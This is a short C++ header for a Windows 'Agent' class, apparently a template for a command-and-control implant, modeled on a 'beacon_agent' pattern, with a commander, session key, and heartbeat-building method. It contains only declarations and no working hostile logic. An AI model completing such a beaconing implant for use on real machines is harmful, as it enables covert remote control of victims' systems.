// __NAME__ Agent — Main Agent Class
//
// Orchestrates all agent components: config, connector, commander, crypto.
// Modeled on beacon_agent's Agent class pattern.

#pragma once

#include <windows.h>

// Forward declarations
class Commander;

class Agent
{
public:
    Commander* commander = nullptr;
    BYTE*      sessionKey = nullptr;
    BOOL       active = TRUE;

    Agent();
    ~Agent();

    BOOL  IsActive();
    BYTE* BuildBeat(ULONG* size);
};
